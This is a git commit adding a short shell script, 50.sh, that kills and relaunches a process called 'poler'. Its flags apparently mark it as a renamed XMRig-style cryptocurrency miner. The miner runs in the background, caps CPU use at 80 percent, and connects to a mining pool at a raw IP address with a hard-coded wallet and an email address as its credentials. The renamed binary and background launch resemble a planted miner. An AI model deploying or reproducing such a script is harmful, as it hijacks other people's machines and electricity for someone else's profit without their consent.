83af023554298cd8500233cb487c853f95669a69
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-05-12 19:49:00 +0300

    #PRIMADD(a5)

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 3 -o 109.234.34.57:5994 -u 4297XE2wiBecRU6hp7j6mwE6t7TmCF7eEMpyDvWLQS7n2a5S7ahcZMVPbitLS3tzySXJwgGcGyP4U8bpAHjECBf6BvscfPi --pass=a5:nikolajzarkov770@gmail.com -k
